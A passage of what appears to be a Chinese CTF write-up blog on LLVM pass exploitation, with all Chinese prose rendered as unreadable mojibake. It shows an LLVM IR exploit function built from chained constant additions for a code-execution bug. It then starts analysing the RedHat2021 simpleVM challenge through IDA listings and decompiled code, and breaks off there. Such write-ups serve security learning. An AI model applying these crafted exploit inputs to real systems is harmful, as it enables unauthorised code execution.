16999840169015142506</span><br><span class="line">  %6 = add nsw i64 %5, 16999840042827329464</span><br><span class="line">  %7 = add nsw i64 %6, 16999840167141359944</span><br><span class="line">  %8 = add nsw i64 %7, 16999802617337939272</span><br><span class="line">  %9 = add nsw i64 %8, 16999840169015152720</span><br><span class="line">  %10 = add nsw i64 %9, 16999840169020852552</span><br><span class="line">  %11 = add nsw i64 %10, 16999839548121314152</span><br><span class="line">  %12 = add nsw i64 %11, 16999840169015178801</span><br><span class="line">  %13 = add nsw i64 %12, 16999840169015152726</span><br><span class="line">  %14 = add nsw i64 %13, 16999840169015117930</span><br><span class="line">  %15 = add nsw i64 %14, 16999840169015152734</span><br><span class="line">  %16 = add nsw i64 %15, 16999840169020752200</span><br><span class="line">  %17 = add nsw i64 %16, 16999840169015152726</span><br><span class="line">  %18 = add nsw i64 %17, 16999840169020787016</span><br><span class="line">  %19 = add nsw i64 %18, 16999840169015169585</span><br><span class="line">  %20 = add nsw i64 %19, 16999840169015130986</span><br><span class="line">  %21 = add nsw i64 %20, 16999840169015152728</span><br><span class="line">  %22 = add nsw i64 %21, 16999840169015117071</span><br><span class="line">  %23 = add nsw i64 %22, 256</span><br><span class="line">  %24 = add nsw i64 %23, 256</span><br><span class="line">  %25 = add nsw i64 %24, 256</span><br><span class="line">  %26 = add nsw i64 %25, 256</span><br><span class="line">  %27 = add nsw i64 %26, 256</span><br><span class="line">  %28 = add nsw i64 %27, 256</span><br><span class="line">  %29 = add nsw i64 %28, 256</span><br><span class="line">  %30 = add nsw i64 %29, 256</span><br><span class="line">  %31 = add nsw i64 %30, 256</span><br><span class="line">  %32 = add nsw i64 %31, 256</span><br><span class="line">  %33 = add nsw i64 %32, 256</span><br><span class="line">  %34 = add nsw i64 %33, 256</span><br><span class="line">  %35 = add nsw i64 %34, 256</span><br><span class="line">  %36 = add nsw i64 %35, 256</span><br><span class="line">  %37 = add nsw i64 %36, 256</span><br><span class="line">  %38 = add nsw i64 %37, 256</span><br><span class="line">  %39 = add nsw i64 %38, 256</span><br><span class="line">  %40 = add nsw i64 %39, 256</span><br><span class="line">  %41 = add nsw i64 %40, 256</span><br><span class="line">  %42 = add nsw i64 %41, 256</span><br><span class="line">  %43 = add nsw i64 %42, 256</span><br><span class="line">  %44 = add nsw i64 %43, 256</span><br><span class="line">  %45 = add nsw i64 %44, 256</span><br><span class="line">  %46 = add nsw i64 %45, 256</span><br><span class="line">  %47 = add nsw i64 %46, 256</span><br><span class="line">  %48 = add nsw i64 %47, 256</span><br><span class="line">  %49 = add nsw i64 %48, 256</span><br><span class="line">  %50 = add nsw i64 %49, 256</span><br><span class="line">  %51 = add nsw i64 %50, 256</span><br><span class="line">  %52 = add nsw i64 %51, 256</span><br><span class="line">  %53 = add nsw i64 %52, 256</span><br><span class="line">  %54 = add nsw i64 %53, 256</span><br><span class="line">  %55 = add nsw i64 %54, 256</span><br><span class="line">  %56 = add nsw i64 %55, 256</span><br><span class="line">  %57 = add nsw i64 %56, 256</span><br><span class="line">  %58 = add nsw i64 %57, 256</span><br><span class="line">  %59 = add nsw i64 %58, 256</span><br><span class="line">  %60 = add nsw i64 %59, 256</span><br><span class="line">  %61 = add nsw i64 %60, 256</span><br><span class="line">  %62 = add nsw i64 %61, 256</span><br><span class="line">  %63 = add nsw i64 %62, 256</span><br><span class="line">  %64 = add nsw i64 %63, 256</span><br><span class="line">  %65 = add nsw i64 %64, 256</span><br><span class="line">  %66 = add nsw i64 %65, 256</span><br><span class="line">  %67 = add nsw i64 %66, 256</span><br><span class="line">  %68 = add nsw i64 %67, 256</span><br><span class="line">  %69 = add nsw i64 %68, 256</span><br><span class="line">  %70 = add nsw i64 %69, 256</span><br><span class="line">  %71 = add nsw i64 %70, 256</span><br><span class="line">  %72 = add nsw i64 %71, 256</span><br><span class="line">  %73 = add nsw i64 %72, 256</span><br><span class="line">  %74 = add nsw i64 %73, 256</span><br><span class="line">  %75 = add nsw i64 %74, 256</span><br><span class="line">  %76 = add nsw i64 %75, 256</span><br><span class="line">  %77 = add nsw i64 %76, 256</span><br><span class="line">  %78 = add nsw i64 %77, 256</span><br><span class="line">  %79 = add nsw i64 %78, 256</span><br><span class="line">  %80 = add nsw i64 %79, 256</span><br><span class="line">  %81 = add nsw i64 %80, 256</span><br><span class="line">  %82 = add nsw i64 %81, 256</span><br><span class="line">  %83 = add nsw i64 %82, 256</span><br><span class="line">  %84 = add nsw i64 %83, 256</span><br><span class="line">  %85 = add nsw i64 %84, 256</span><br><span class="line">  %86 = add nsw i64 %85, 256</span><br><span class="line">  %87 = add nsw i64 %86, 256</span><br><span class="line">  %88 = add nsw i64 %87, 256</span><br><span class="line">  %89 = add nsw i64 %88, 256</span><br><span class="line">  %90 = add nsw i64 %89, 256</span><br><span class="line">  %91 = add nsw i64 %90, 256</span><br><span class="line">  %92 = add nsw i64 %91, 256</span><br><span class="line">  %93 = add nsw i64 %92, 256</span><br><span class="line">  %94 = add nsw i64 %93, 256</span><br><span class="line">  %95 = add nsw i64 %94, 256</span><br><span class="line">  %96 = add nsw i64 %95, 256</span><br><span class="line">  %97 = add nsw i64 %96, 256</span><br><span class="line">  %98 = add nsw i64 %97, 256</span><br><span class="line">  %99 = add nsw i64 %98, 256</span><br><span class="line">  %100 = add nsw i64 %99, 256</span><br><span class="line">  %101 = add nsw i64 %100, 256</span><br><span class="line">  %102 = add nsw i64 %101, 256</span><br><span class="line">  %103 = add nsw i64 %102, 256</span><br><span class="line">  %104 = add nsw i64 %103, 256</span><br><span class="line">  %105 = add nsw i64 %104, 256</span><br><span class="line">  %106 = add nsw i64 %105, 256</span><br><span class="line">  %107 = add nsw i64 %106, 256</span><br><span class="line">  %108 = add nsw i64 %107, 256</span><br><span class="line">  %109 = add nsw i64 %108, 256</span><br><span class="line">  %110 = add nsw i64 %109, 256</span><br><span class="line">  %111 = add nsw i64 %110, 256</span><br><span class="line">  %112 = add nsw i64 %111, 256</span><br><span class="line">  %113 = add nsw i64 %112, 256</span><br><span class="line">  %114 = add nsw i64 %113, 256</span><br><span class="line">  %115 = add nsw i64 %114, 256</span><br><span class="line">  %116 = add nsw i64 %115, 256</span><br><span class="line">  %117 = add nsw i64 %116, 256</span><br><span class="line">  %118 = add nsw i64 %117, 256</span><br><span class="line">  %119 = add nsw i64 %118, 256</span><br><span class="line">  %120 = add nsw i64 %119, 256</span><br><span class="line">  %121 = add nsw i64 %120, 256</span><br><span class="line">  %122 = add nsw i64 %121, 256</span><br><span class="line">  %123 = add nsw i64 %122, 256</span><br><span class="line">  %124 = add nsw i64 %123, 256</span><br><span class="line">  %125 = add nsw i64 %124, 256</span><br><span class="line">  %126 = add nsw i64 %125, 256</span><br><span class="line">  %127 = add nsw i64 %126, 256</span><br><span class="line">  %128 = add nsw i64 %127, 256</span><br><span class="line">  %129 = add nsw i64 %128, 256</span><br><span class="line">  %130 = add nsw i64 %129, 256</span><br><span class="line">  %131 = add nsw i64 %130, 256</span><br><span class="line">  %132 = add nsw i64 %131, 256</span><br><span class="line">  %133 = add nsw i64 %132, 256</span><br><span class="line">  %134 = add nsw i64 %133, 256</span><br><span class="line">  %135 = add nsw i64 %134, 256</span><br><span class="line">  %136 = add nsw i64 %135, 256</span><br><span class="line">  %137 = add nsw i64 %136, 256</span><br><span class="line">  %138 = add nsw i64 %137, 256</span><br><span class="line">  %139 = add nsw i64 %138, 256</span><br><span class="line">  %140 = add nsw i64 %139, 256</span><br><span class="line">  %141 = add nsw i64 %140, 256</span><br><span class="line">  %142 = add nsw i64 %141, 256</span><br><span class="line">  %143 = add nsw i64 %142, 256</span><br><span class="line">  %144 = add nsw i64 %143, 256</span><br><span class="line">  %145 = add nsw i64 %144, 256</span><br><span class="line">  %146 = add nsw i64 %145, 256</span><br><span class="line">  %147 = add nsw i64 %146, 256</span><br><span class="line">  %148 = add nsw i64 %147, 256</span><br><span class="line">  %149 = add nsw i64 %148, 256</span><br><span class="line">  %150 = add nsw i64 %149, 256</span><br><span class="line">  %151 = add nsw i64 %150, 256</span><br><span class="line">  %152 = add nsw i64 %151, 256</span><br><span class="line">  %153 = add nsw i64 %152, 256</span><br><span class="line">  %154 = add nsw i64 %153, 256</span><br><span class="line">  %155 = add nsw i64 %154, 256</span><br><span class="line">  %156 = add nsw i64 %155, 256</span><br><span class="line">  %157 = add nsw i64 %156, 256</span><br><span class="line">  %158 = add nsw i64 %157, 256</span><br><span class="line">  %159 = add nsw i64 %158, 256</span><br><span class="line">  %160 = add nsw i64 %159, 256</span><br><span class="line">  %161 = add nsw i64 %160, 256</span><br><span class="line">  %162 = add nsw i64 %161, 256</span><br><span class="line">  %163 = add nsw i64 %162, 256</span><br><span class="line">  %164 = add nsw i64 %163, 256</span><br><span class="line">  %165 = add nsw i64 %164, 256</span><br><span class="line">  %166 = add nsw i64 %165, 256</span><br><span class="line">  %167 = add nsw i64 %166, 256</span><br><span class="line">  %168 = add nsw i64 %167, 256</span><br><span class="line">  %169 = add nsw i64 %168, 256</span><br><span class="line">  %170 = add nsw i64 %169, 256</span><br><span class="line">  %171 = add nsw i64 %170, 256</span><br><span class="line">  %172 = add nsw i64 %171, 256</span><br><span class="line">  %173 = add nsw i64 %172, 256</span><br><span class="line">  %174 = add nsw i64 %173, 256</span><br><span class="line">  %175 = add nsw i64 %174, 256</span><br><span class="line">  %176 = add nsw i64 %175, 256</span><br><span class="line">  %177 = add nsw i64 %176, 256</span><br><span class="line">  %178 = add nsw i64 %177, 256</span><br><span class="line">  %179 = add nsw i64 %178, 256</span><br><span class="line">  %180 = add nsw i64 %179, 256</span><br><span class="line">  %181 = add nsw i64 %180, 256</span><br><span class="line">  %182 = add nsw i64 %181, 256</span><br><span class="line">  %183 = add nsw i64 %182, 256</span><br><span class="line">  %184 = add nsw i64 %183, 256</span><br><span class="line">  %185 = add nsw i64 %184, 256</span><br><span class="line">  %186 = add nsw i64 %185, 256</span><br><span class="line">  %187 = add nsw i64 %186, 256</span><br><span class="line">  %188 = add nsw i64 %187, 256</span><br><span class="line">  %189 = add nsw i64 %188, 256</span><br><span class="line">  %190 = add nsw i64 %189, 256</span><br><span class="line">  %191 = add nsw i64 %190, 256</span><br><span class="line">  %192 = add nsw i64 %191, 256</span><br><span class="line">  %193 = add nsw i64 %192, 256</span><br><span class="line">  %194 = add nsw i64 %193, 256</span><br><span class="line">  %195 = add nsw i64 %194, 256</span><br><span class="line">  %196 = add nsw i64 %195, 256</span><br><span class="line">  %197 = add nsw i64 %196, 256</span><br><span class="line">  %198 = add nsw i64 %197, 256</span><br><span class="line">  %199 = add nsw i64 %198, 256</span><br><span class="line">  %200 = add nsw i64 %199, 256</span><br><span class="line">  %201 = add nsw i64 %200, 256</span><br><span class="line">  %202 = add nsw i64 %201, 256</span><br><span class="line">  %203 = add nsw i64 %202, 256</span><br><span class="line">  %204 = add nsw i64 %203, 256</span><br><span class="line">  %205 = add nsw i64 %204, 256</span><br><span class="line">  %206 = add nsw i64 %205, 256</span><br><span class="line">  %207 = add nsw i64 %206, 256</span><br><span class="line">  %208 = add nsw i64 %207, 256</span><br><span class="line">  %209 = add nsw i64 %208, 256</span><br><span class="line">  %210 = add nsw i64 %209, 256</span><br><span class="line">  %211 = add nsw i64 %210, 256</span><br><span class="line">  %212 = add nsw i64 %211, 256</span><br><span class="line">  %213 = add nsw i64 %212, 256</span><br><span class="line">  %214 = add nsw i64 %213, 256</span><br><span class="line">  %215 = add nsw i64 %214, 256</span><br><span class="line">  %216 = add nsw i64 %215, 256</span><br><span class="line">  %217 = add nsw i64 %216, 256</span><br><span class="line">  %218 = add nsw i64 %217, 256</span><br><span class="line">  %219 = add nsw i64 %218, 256</span><br><span class="line">  %220 = add nsw i64 %219, 256</span><br><span class="line">  %221 = add nsw i64 %220, 256</span><br><span class="line">  %222 = add nsw i64 %221, 256</span><br><span class="line">  %223 = add nsw i64 %222, 256</span><br><span class="line">  %224 = add nsw i64 %223, 256</span><br><span class="line">  %225 = add nsw i64 %224, 256</span><br><span class="line">  %226 = add nsw i64 %225, 256</span><br><span class="line">  %227 = add nsw i64 %226, 256</span><br><span class="line">  %228 = add nsw i64 %227, 256</span><br><span class="line">  %229 = add nsw i64 %228, 256</span><br><span class="line">  %230 = add nsw i64 %229, 256</span><br><span class="line">  %231 = add nsw i64 %230, 256</span><br><span class="line">  %232 = add nsw i64 %231, 256</span><br><span class="line">  %233 = add nsw i64 %232, 256</span><br><span class="line">  %234 = add nsw i64 %233, 256</span><br><span class="line">  %235 = add nsw i64 %234, 256</span><br><span class="line">  %236 = add nsw i64 %235, 256</span><br><span class="line">  %237 = add nsw i64 %236, 256</span><br><span class="line">  %238 = add nsw i64 %237, 256</span><br><span class="line">  %239 = add nsw i64 %238, 256</span><br><span class="line">  %240 = add nsw i64 %239, 256</span><br><span class="line">  %241 = add nsw i64 %240, 256</span><br><span class="line">  %242 = add nsw i64 %241, 256</span><br><span class="line">  %243 = add nsw i64 %242, 256</span><br><span class="line">  %244 = add nsw i64 %243, 256</span><br><span class="line">  %245 = add nsw i64 %244, 256</span><br><span class="line">  %246 = add nsw i64 %245, 256</span><br><span class="line">  %247 = add nsw i64 %246, 256</span><br><span class="line">  %248 = add nsw i64 %247, 256</span><br><span class="line">  %249 = add nsw i64 %248, 256</span><br><span class="line">  %250 = add nsw i64 %249, 256</span><br><span class="line">  %251 = add nsw i64 %250, 256</span><br><span class="line">  %252 = add nsw i64 %251, 256</span><br><span class="line">  %253 = add nsw i64 %252, 256</span><br><span class="line">  %254 = add nsw i64 %253, 256</span><br><span class="line">  %255 = add nsw i64 %254, 256</span><br><span class="line">  %256 = add nsw i64 %255, 256</span><br><span class="line">  %257 = add nsw i64 %256, 256</span><br><span class="line">  %258 = add nsw i64 %257, 256</span><br><span class="line">  %259 = add nsw i64 %258, 256</span><br><span class="line">  %260 = add nsw i64 %259, 256</span><br><span class="line">  %261 = add nsw i64 %260, 256</span><br><span class="line">  %262 = add nsw i64 %261, 256</span><br><span class="line">  %263 = add nsw i64 %262, 256</span><br><span class="line">  %264 = add nsw i64 %263, 256</span><br><span class="line">  %265 = add nsw i64 %264, 256</span><br><span class="line">  %266 = add nsw i64 %265, 256</span><br><span class="line">  %267 = add nsw i64 %266, 256</span><br><span class="line">  %268 = add nsw i64 %267, 256</span><br><span class="line">  %269 = add nsw i64 %268, 256</span><br><span class="line">  %270 = add nsw i64 %269, 256</span><br><span class="line">  %271 = add nsw i64 %270, 256</span><br><span class="line">  %272 = add nsw i64 %271, 256</span><br><span class="line">  %273 = add nsw i64 %272, 256</span><br><span class="line">  %274 = add nsw i64 %273, 256</span><br><span class="line">  %275 = add nsw i64 %274, 256</span><br><span class="line">  %276 = add nsw i64 %275, 256</span><br><span class="line">  %277 = add nsw i64 %276, 256</span><br><span class="line">  %278 = add nsw i64 %277, 256</span><br><span class="line">  %279 = add nsw i64 %278, 256</span><br><span class="line">  %280 = add nsw i64 %279, 256</span><br><span class="line">  %281 = add nsw i64 %280, 256</span><br><span class="line">  %282 = add nsw i64 %281, 256</span><br><span class="line">  %283 = add nsw i64 %282, 256</span><br><span class="line">  %284 = add nsw i64 %283, 256</span><br><span class="line">  %285 = add nsw i64 %284, 256</span><br><span class="line">  %286 = add nsw i64 %285, 256</span><br><span class="line">  %287 = add nsw i64 %286, 256</span><br><span class="line">  %288 = add nsw i64 %287, 256</span><br><span class="line">  %289 = add nsw i64 %288, 256</span><br><span class="line">  %290 = add nsw i64 %289, 256</span><br><span class="line">  %291 = add nsw i64 %290, 256</span><br><span class="line">  %292 = add nsw i64 %291, 256</span><br><span class="line">  %293 = add nsw i64 %292, 256</span><br><span class="line">  %294 = add nsw i64 %293, 256</span><br><span class="line">  %295 = add nsw i64 %294, 256</span><br><span class="line">  %296 = add nsw i64 %295, 256</span><br><span class="line">  %297 = add nsw i64 %296, 256</span><br><span class="line">  %298 = add nsw i64 %297, 256</span><br><span class="line">  %299 = add nsw i64 %298, 256</span><br><span class="line">  %300 = add nsw i64 %299, 256</span><br><span class="line">  %301 = add nsw i64 %300, 256</span><br><span class="line">  %302 = add nsw i64 %301, 256</span><br><span class="line">  %303 = add nsw i64 %302, 256</span><br><span class="line">  %304 = add nsw i64 %303, 256</span><br><span class="line">  %305 = add nsw i64 %304, 256</span><br><span class="line">  %306 = add nsw i64 %305, 256</span><br><span class="line">  %307 = add nsw i64 %306, 256</span><br><span class="line">  %308 = add nsw i64 %307, 256</span><br><span class="line">  %309 = add nsw i64 %308, 256</span><br><span class="line">  %310 = add nsw i64 %309, 256</span><br><span class="line">  %311 = add nsw i64 %310, 256</span><br><span class="line">  %312 = add nsw i64 %311, 256</span><br><span class="line">  %313 = add nsw i64 %312, 256</span><br><span class="line">  %314 = add nsw i64 %313, 1</span><br><span class="line">  %315 = add nsw i64 %314, 1</span><br><span class="line">  %316 = add nsw i64 %315, 1</span><br><span class="line">  %317 = add nsw i64 %316, 256</span><br><span class="line">  %318 = add nsw i64 %317, 256</span><br><span class="line">  %319 = add nsw i64 %318, 256</span><br><span class="line">  ret i64 %319</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;Ubuntu clang version 12.0.0-3ubuntu1~20.04.5&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>æœ¬é¢˜çš„æ¼æ´ç‚¹åœ¨äºä»£ç æ‰§è¡Œã€‚åœ¨åšé¢˜çš„æ—¶å€™ï¼Œè¦ç‰¹åˆ«æ³¨æ„åŠ¨æ€ä»£ç æ‰§è¡Œéƒ¨åˆ†ï¼Œè¿™ä¸ªéƒ¨åˆ†å¾€å¾€å°±æ˜¯æ¼æ´äº§ç”Ÿçš„åœ°æ–¹ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">LLVM pass pwn å…¥é—¨ (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:37:20" itemprop="dateCreated datePublished" datetime="2023-02-28T22:37:20+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:50" itemprop="dateModified" datetime="2023-03-01T11:30:50+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹çº¢å¸½æ¯2021-simpleVMè¿™é“é¢˜ï¼Œç”±äºå’Œä¸Šä¸€é“é¢˜ç›¸æ¯”è¿™é“é¢˜ç›¸å¯¹æ›´åŠ ç®€å•äº›ï¼Œè¯»è€…å¯ä»¥åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å®æ“ä¸€ä¸‹ï¼Œé‡åˆ°å›°éš¾æ—¶å†é€šè¿‡æœ¬æ–‡æ‰¾åˆ°ç­”æ¡ˆï¼Œè¿™æ ·èƒ½å¤Ÿæ›´å¥½åœ°æå‡æˆ‘ä»¬çš„åšé¢˜å®è·µèƒ½åŠ›ã€‚ï¼ˆæœ¬é¢˜çš„é™„ä»¶å¯ä»¥åœ¨Githubä¸Šæ‰¾åˆ°ï¼Œåœ¨ç¬”è€…çš„Githubä¸­ä¹Ÿæœ‰ä¿å­˜ï¼‰</p>
<h1 id="redhat2021-simplevm"><a class="markdownIt-Anchor" href="#redhat2021-simplevm"></a> RedHat2021-simpleVM</h1>
<p>é¦–å…ˆè¿˜æ˜¯ä½¿ç”¨IDAæ‰“å¼€ï¼Œæ‰¾åˆ°äº†å‡ ä¸ªæ²¡æœ‰åå­—çš„å‡½æ•°ï¼š</p>
<p><img src="1.png" alt="" /></p>
<h2 id="step-1-æ‰¾åˆ°runonfunctionå‡½æ•°"><a class="markdownIt-Anchor" href="#step-1-æ‰¾åˆ°runonfunctionå‡½æ•°"></a> Step 1: æ‰¾åˆ°runOnFunctionå‡½æ•°</h2>
<p>å¦‚æœè¯»è€…è¿˜è®°å¾—ä¸Šä¸€ç¯‡æ–‡ç« çš„æ–¹æ³•ï¼Œè¿™ä¸€æ­¥åº”è¯¥æ¥è¯´ä¸éš¾æƒ³åˆ°ã€‚æˆ‘ä»¬æ˜¯é€šè¿‡IDAæ±‡ç¼–ç•Œé¢ä¸­å¯¹å‡½æ•°çš„äº¤å‰å¼•ç”¨æƒ…å†µè¿›è¡Œåˆ¤æ–­çš„ï¼Œå¦‚æœè¿™ä¸ªå‡½æ•°æ²¡æœ‰æ•°æ®æ®µçš„äº¤å‰å¼•ç”¨ï¼Œé‚£ä¹ˆå®ƒä¸€å®šä¸æ˜¯runOnFunctionå‡½æ•°ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªè¦†å†™çš„å‡½æ•°ï¼Œå…¶åœ°å€ä¼šè¢«ä¿å­˜åˆ°vtableç»“æ„ä½“ä¸­ã€‚æ ¹æ®è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¤šä¸ªå‡½æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000006780 sub_6780        proc near               ; CODE XREF: sub_67D0+24â†“p</span><br><span class="line">LOAD:0000000000006780                                         ; DATA XREF: LOAD:off_20DD20â†“o</span><br><span class="line">...</span><br><span class="line">LOAD:00000000000067D0 sub_67D0        proc near               ; DATA XREF: LOAD:000000000020DD28â†“o</span><br><span class="line">...</span><br><span class="line">LOAD:0000000000006830 sub_6830        proc near               ; DATA XREF: LOAD:000000000020DDA8â†“o</span><br></pre></td></tr></table></figure>
<p><img src="2.png" alt="" /><br />
<img src="3.png" alt="" /><br />
å…¶ä¸­æˆ‘ä»¬æ‰“å¼€å‰ä¸¤ä¸ªå‡½æ•°ï¼Œå‘ç°éƒ½æ˜¯ä¸€äº›åˆ é™¤å’Œè°ƒç”¨ææ„å‡½æ•°çš„æ“ä½œï¼Œå› æ­¤è¿™ä¸€å®šä¸æ˜¯runOnFunctionå‡½æ•°çš„è¦†å†™ã€‚æ•…runOnFunctionåº”è¯¥æ˜¯sub_6830å‡½æ•°ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">runOnFunction</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="step-2-åˆ†ærunonfunctionå‡½æ•°"><a class="markdownIt-Anchor" href="#step-2-åˆ†ærunonfunctionå‡½æ•°"></a> Step 2: åˆ†ærunOnFunctionå‡½æ•°</h2>
<p>ä¸Šé¢çš„ä»£ç å°±æ˜¯åæ±‡ç¼–å‡ºæ¥çš„runOnFunctionå‡½æ•°ï¼Œå’Œä¸Šä¸€ç¯‡æ–‡ç« å›½èµ›é¢˜çœ¼èŠ±ç¼­ä¹±çš„ä»£ç æ®µç›¸æ¯”ï¼Œè¿˜æ˜¯å‹å¥½äº†ä¸å°‘çš„ï¼Œä»£ç çš„é€»è¾‘æ¸…æ™°å¯è§ã€‚</p>
